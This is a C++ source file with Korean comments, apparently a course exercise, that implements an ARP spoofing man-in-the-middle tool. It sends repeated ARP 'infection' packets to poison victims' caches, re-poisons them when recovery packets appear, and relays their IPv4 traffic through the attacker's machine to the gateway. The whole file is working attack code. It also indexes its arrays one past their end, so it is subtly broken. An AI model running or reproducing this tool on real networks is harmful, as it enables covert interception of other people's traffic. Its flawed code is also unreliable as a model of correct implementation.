#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "main.h"
#include <thread>
#include <signal.h>

#pragma pack(push, 1)
#pragma pack(pop)

int main(int argc, char* argv[]) {
	if (argc < 4 || argc%2 == 1) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	const int flows = (argc-2)/2;

	pcap_t* handler = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);	//pcap을 여는 함수, (패킷을오픈할디바이스, 패킷최대크기, promiscuous, timeout, 에러버퍼)
	if (handler == NULL) {
		perror("pcap_open_live");
		return -1;
	}

	Mac sendermac[flows], targetmac[flows];
	Ip senderip[flows], targetip[flows];

	/*
	address resolving & send infection packet
	*/
	memac = GetInterfaceMacAddress(dev);
	meip = GetInterfaceIPAddress(dev);

	printf("my address information\n");
	printf("memac: %s\n",std::string(memac).data());
	printf("meip: %s\n\n",std::string(meip).data());
	
	for(int i=1; i<=flows; i++){
		senderip[i] = Ip(argv[2*i]);	targetip[i] = Ip(argv[2*i+1]);
		//1.sender(sender)의 mac주소 2.target(gateway)의 mac주소
		sendermac[i] = resolve_MacAddress(handler,senderip[i]);
		targetmac[i] = resolve_MacAddress(handler,targetip[i]);

		printf("[%d] flow in progress...\n",i);
		printf("sender mac = %s\n",std::string(sendermac[i]).data());
		printf("target mac = %s\n",std::string(targetmac[i]).data());

		//3.공격패킷을 주기적으로 전송하는 쓰레드 생성
		std::thread t (send_arp_infection_packet_thread,dev,targetip[i],sendermac[i],senderip[i],i);
		t.detach();
	}
	
	/*
	realy
	*/
	while (true) {
		struct pcap_pkthdr* header;	//패킷 헤더를 담는 구조체
		const u_char* packet;		//패킷 데이터를 읽어올 위치
		int res = pcap_next_ex(handler, &header, &packet);	//pcap에서 데이터를 읽어 header에 패킷헤더를 저장하고 packet가 패킷 데이터를 가르키도록 함
		if (res == 0) continue;	//timeout
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {	
			perror("pcap_next_ex");
			return -1;
		}

		struct EthHdr *ethhdr = (struct EthHdr *) (packet);


		//모든 flow를 하나씩 비교해 가면서 packet relay를 해야하는지 판단
		for(int i=1;i<=flows;i++){
			
			//1. ARP패킷이 잡힌 경우 recovering여부를 판단
			if(ntohs(ethhdr->type_)==EthHdr::Arp && is_recovering(packet,sendermac[i],targetmac[i],targetip[i])){
					printf("[%d] recovering packet captured\n",i);
					send_arp_infection_packet(handler,targetip[i],sendermac[i],senderip[i],i);
					break;
			}


			//2. smac이 sender가 아닌 경우는 relay 필요 X
			if(ethhdr->smac_!=sendermac[i]) continue;

			//3. dmac이 broadcast인 경우 relay 필요 X
			if(ethhdr->dmac_==bcast)	continue;	

			//4. IP패킷이 잡힌 경우 relay
			if(ntohs(ethhdr->type_)==EthHdr::Ip4) {
				struct my_ipv4_hdr *iphdr = (struct my_ipv4_hdr *) (ethhdr+1);
				uint32_t pktlen = sizeof(struct EthHdr) + ntohs(iphdr->ip_len);

				printf("[%d] relay from %s ",i,inet_ntoa(iphdr->ip_src));
				printf("to %s (%d bytes)\n",inet_ntoa(iphdr->ip_dst),pktlen);

				//패킷의 이더넷 맥주소를 변경(  sender->me  --->  me->target(gateway))
				ethhdr->smac_ = memac;
				ethhdr->dmac_ = targetmac[i];

				//handler의 max buf size보다 큰 패킷은 전송 X
				if(pktlen >= BUFSIZ) break;	

				if(pcap_sendpacket(handler, packet, pktlen)!=0){
					perror("pcap_sendpacket");
					return -1;
				}

				break;
			}
		}	
	}

	pcap_close(handler);
}
